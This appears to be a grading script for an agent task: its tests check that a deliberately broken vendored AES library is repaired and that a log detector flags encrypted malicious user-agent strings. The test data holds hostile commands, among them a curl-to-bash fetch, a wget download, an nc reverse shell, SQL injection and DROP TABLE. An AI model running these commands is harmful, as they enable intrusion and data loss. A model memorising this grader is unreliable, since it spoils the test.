#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import binascii
import os
import secrets
import subprocess
import tempfile
import textwrap

import pytest
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def test_pyaes_is_fixed():
    aes_path = "/app/pyaes-1.6.1/pyaes/aes.py"
    assert os.path.exists(aes_path), f"The vendored pyaes file is missing at {aes_path}"
    with open(aes_path, "r") as f:
        content = f.read()
    assert "return (x ^ y)" in content and "return (x + y)" not in content, \
        "The perturbation in aes.py has not been correctly fixed. Expected bitwise XOR."


def test_vendored_pyaes_imports_and_matches_aes_vector():
    code = r'''
import binascii
import os
import sys
sys.path.insert(0, "/app/pyaes-1.6.1")
import pyaes
origin = os.path.realpath(pyaes.__file__)
assert origin.startswith("/app/pyaes-1.6.1/"), origin
key = binascii.unhexlify("000102030405060708090a0b0c0d0e0f")
plain = binascii.unhexlify("00112233445566778899aabbccddeeff")
expected = binascii.unhexlify("69c4e0d86a7b0430d8cdb78070b4c55a")
aes = pyaes.AESModeOfOperationECB(key)
assert aes.encrypt(plain) == expected
assert aes.decrypt(expected) == plain
'''
    result = subprocess.run(["python3", "-S", "-c", code], capture_output=True, text=True)
    assert result.returncode == 0, result.stderr


def test_detector_script_exists():
    detector_path = "/home/user/detector.py"
    assert os.path.exists(detector_path), f"The detector script {detector_path} is missing."
    assert os.path.isfile(detector_path), f"The path {detector_path} is not a file."


def test_adversarial_corpus_clean():
    detector_path = "/home/user/detector.py"
    clean_dir = "/app/corpora/clean/"
    assert os.path.exists(clean_dir), f"Clean corpus directory missing at {clean_dir}"

    clean_files = [f for f in os.listdir(clean_dir) if os.path.isfile(os.path.join(clean_dir, f))]
    assert len(clean_files) > 0, "No files found in the clean corpus."

    failed_files = []
    for filename in clean_files:
        filepath = os.path.join(clean_dir, filename)
        result = subprocess.run(
            ["python3", detector_path, filepath],
            capture_output=True,
            text=True
        )
        output = result.stdout.strip()
        if output != "SAFE":
            failed_files.append(filename)

    if failed_files:
        pytest.fail(f"{len(failed_files)} of {len(clean_files)} clean modified/flagged incorrectly. Offending files: {', '.join(failed_files)}")


def test_adversarial_corpus_evil():
    detector_path = "/home/user/detector.py"
    evil_dir = "/app/corpora/evil/"
    assert os.path.exists(evil_dir), f"Evil corpus directory missing at {evil_dir}"

    evil_files = [f for f in os.listdir(evil_dir) if os.path.isfile(os.path.join(evil_dir, f))]
    assert len(evil_files) > 0, "No files found in the evil corpus."

    failed_files = []
    for filename in evil_files:
        filepath = os.path.join(evil_dir, filename)
        result = subprocess.run(
            ["python3", detector_path, filepath],
            capture_output=True,
            text=True
        )
        output = result.stdout.strip()
        if output != "EVIL":
            failed_files.append(filename)

    if failed_files:
        pytest.fail(f"{len(failed_files)} of {len(evil_files)} evil bypassed. Offending files: {', '.join(failed_files)}")


def _pad(data):
    amount = 16 - (len(data) % 16)
    return data + bytes([amount]) * amount


def _encrypt(payload):
    key = b"ForensicsTaskKey123!"[:16]
    encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()
    return binascii.hexlify(encryptor.update(_pad(payload)) + encryptor.finalize()).decode()


def _write_log(path, user_agent):
    with open(path, "w") as f:
        f.write('203.0.113.27 - - [11/Nov/2024:09:10:11 +0000] "GET /asset HTTP/1.1" 200 321 "-" "' + user_agent + '"\n')


def test_detector_on_generated_neutral_paths_and_payloads():
    detector = "/home/user/detector.py"
    token = secrets.token_hex(12)
    benign = [
        f"Mozilla/5.0 (X11; Linux x86_64) Firefox/{secrets.randbelow(80) + 40}.{secrets.randbelow(10)}",
        f"Mozilla/5.0 AppleWebKit/537.36 Chrome/{secrets.randbelow(70) + 50}.0 session-{token}",
        f"Normal monitoring client request-id={secrets.token_hex(16)}",
    ]
    malicious = [
        f"trace={secrets.token_hex(10)}; /bin/sh -c 'id'",
        f"nonce={secrets.token_hex(9)} UNION SELECT username, password FROM users--",
        f"job={secrets.token_hex(8)}; curl http://{secrets.token_hex(6)}.invalid/payload.sh | bash",
        f"request={secrets.token_hex(7)}; wget http://{secrets.token_hex(6)}.invalid/tool -O /tmp/tool",
        f"audit={secrets.token_hex(11)}; DROP TABLE accounts;",
        f"tag={secrets.token_hex(8)}; nc -e /bin/sh 198.51.100.42 4567",
    ]

    runner_dir = tempfile.mkdtemp(prefix="detector_runner_")
    runner = os.path.join(runner_dir, "invoke.py")
    marker = os.path.join(runner_dir, "pyaes-used")
    with open(runner, "w") as f:
        f.write(textwrap.dedent(r'''
            import builtins
            import os
            import runpy
            import sys

            detector, target, marker = sys.argv[1:4]
            original_import = builtins.__import__

            def tracked_import(name, globals=None, locals=None, fromlist=(), level=0):
                module = original_import(name, globals, locals, fromlist, level)
                if name == "pyaes" or name.startswith("pyaes."):
                    root = sys.modules.get("pyaes")
                    origin = os.path.realpath(getattr(root, "__file__", ""))
                    if not origin.startswith("/app/pyaes-1.6.1/"):
                        raise ImportError("detector did not import the vendored pyaes package")
                    with open(marker, "a") as seen:
                        seen.write("1")
                return module

            builtins.__import__ = tracked_import
            sys.argv = [detector, target]
            runpy.run_path(detector, run_name="__main__")
        '''))

    cases = []
    with tempfile.TemporaryDirectory(prefix="ua_cases_") as case_dir:
        for payload in benign:
            path = os.path.join(case_dir, secrets.token_hex(10) + ".log")
            _write_log(path, _encrypt(payload.encode()))
            cases.append((path, "SAFE"))

        plain_path = os.path.join(case_dir, secrets.token_hex(10) + ".log")
        _write_log(plain_path, f"Mozilla/5.0 benign-{secrets.token_hex(14)}")
        cases.append((plain_path, "SAFE"))

        for payload in malicious:
            path = os.path.join(case_dir, secrets.token_hex(10) + ".log")
            _write_log(path, _encrypt(payload.encode()))
            cases.append((path, "EVIL"))

        for path, expected in cases:
            result = subprocess.run(
                ["python3", "-S", runner, detector, path, marker],
                capture_output=True,
                text=True,
                timeout=10,
            )
            assert result.returncode == 0, f"Detector failed for a generated input: {result.stderr}"
            assert result.stdout.strip() == expected, \
                f"Generated neutral-path case expected {expected}, got {result.stdout.strip()!r}"

    assert os.path.exists(marker), "detector did not import the local vendored pyaes package"
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
